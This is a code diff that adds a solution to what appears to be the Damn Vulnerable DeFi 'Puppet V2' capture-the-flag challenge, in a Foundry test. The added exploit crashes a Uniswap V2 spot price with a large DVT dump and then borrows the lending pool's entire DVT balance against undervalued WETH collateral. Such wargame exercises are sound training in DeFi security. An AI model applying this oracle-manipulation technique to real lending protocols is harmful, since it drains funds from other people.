@@ -80,12 +80,7 @@ contract PuppetV2 is Test {
         assertGt(uniswapV2Pair.balanceOf(deployer), 0);
 
         // Deploy the lending pool
-        puppetV2Pool = new PuppetV2Pool(
-            address(weth),
-            address(dvt),
-            address(uniswapV2Pair),
-            address(uniswapV2Factory)
-        );
+        puppetV2Pool = new PuppetV2Pool(address(weth), address(dvt), address(uniswapV2Pair), address(uniswapV2Factory));
 
         // Setup initial token balances of pool and attacker account
         dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
@@ -103,6 +98,46 @@ contract PuppetV2 is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+
+        // Approve the Uniswap router to spend the attacker's tokens
+        dvt.approve(address(uniswapV2Router), type(uint256).max);
+
+        console.log("Attacker DVT balance before swap: ", dvt.balanceOf(attacker) / 10 ** 18);
+        console.log("Attacker ETH balance before swap: ", attacker.balance / 10 ** 18);
+        console.log("Attacker WETH balance before swap: ", weth.balanceOf(attacker) / 10 ** 18);
+
+        console.log("Token price before swap: ", puppetV2Pool.calculateDepositOfWETHRequired(1 ether) / 3);
+
+        // Swap all DVT for WETH
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+        uniswapV2Router.swapExactTokensForTokens(dvt.balanceOf(attacker), 0, path, attacker, type(uint256).max);
+
+        console.log("Attacker DVT balance after swap: ", dvt.balanceOf(attacker) / 10 ** 18);
+        console.log("Attacker ETH balance after swap: ", attacker.balance / 10 ** 18);
+        console.log("Attacker WETH balance after swap: ", weth.balanceOf(attacker) / 10 ** 18);
+
+        console.log("Token price after swap: ", puppetV2Pool.calculateDepositOfWETHRequired(1 ether) / 3);
+
+        // Convert all ETH to WETH
+        weth.deposit{value: attacker.balance}();
+
+        console.log("Attacker WETH balance after deposit: ", weth.balanceOf(attacker) / 10 ** 18);
+
+        // Approve the pool to spend the attacker's WETH
+        weth.approve(address(puppetV2Pool), type(uint256).max);
+
+        // Borrow all DVT from the pool
+        uint256 wethRequired = puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        console.log("WETH required to borrow all DVT: ", wethRequired / 10 ** 18);
+
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        console.log("Attacker DVT balance after borrowing: ", dvt.balanceOf(attacker) / 10 ** 18);
+        console.log("Pool DVT balance after borrowing: ", dvt.balanceOf(address(puppetV2Pool)) / 10 ** 18);
 
         /**
          * EXPLOIT END *
